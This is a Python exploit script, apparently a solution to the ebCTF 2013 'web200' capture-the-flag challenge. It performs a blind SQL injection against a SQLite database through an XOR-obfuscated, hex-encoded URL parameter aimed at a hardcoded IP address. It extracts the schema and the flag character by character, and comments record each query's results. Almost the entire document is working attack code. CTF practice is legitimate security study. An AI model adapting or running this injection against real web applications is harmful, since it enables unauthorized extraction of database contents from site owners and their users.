
# pwn for "web200"
# ebctf 2013 teaser
# by jiva

import requests
import sys
import string

mfkey = '6640eb273bc826bcbecb43c399f448ee9a1a843b1a2957455e0220f14ebda945'.decode('hex')

def xor(d, k): return ''.join([chr(ord(d[i]) ^ ord(k[i % len(k)])) for i in xrange(len(d))])

chars = string.letters + string.digits +'_(){}[].,;:/?!@#$%^&*'

q = "SELECT tbl_name FROM sqlite_master"
q = "SELECT stock FROM shoes"

# CREATETABLEshoesdescrtextstockintprice
q = "SELECT sql FROM sqlite_master"

# CREATETABLEsecretflagflagtext
q = "SELECT sql FROM sqlite_master WHERE tbl_name != 'shoes' AND type = 'table'" 

# secret_flag
q = "SELECT name FROM sqlite_master WHERE tbl_name != 'shoes'"

# 
q = "SELECT db_name FROM sqlite_master WHERE tbl_name != 'shoes'"

# ebCTF{f824f6f9bd9b7449813dbf9b18d3e668}
q = "SELECT flag FROM secret_flag" 



for pos in xrange(1,50):
  for char in chars: # inefficient but whatever
    sqli = xor("o" + '\n' + "(select case when substr((" +q+ ")," +str(pos)+ ",1)='" +char+ "' then stock else price end) limit 1", mfkey).encode('hex')
    url = 'http://54.228.109.101:5000/?action=display&what=' + sqli
    # print pos, char, url
    r = requests.get(url)
    if r.status_code == 500:
      print 500
      sys.exit()

    if 'Super' in r.text:
      sys.stdout.write(char)
      sys.stdout.flush()
      break


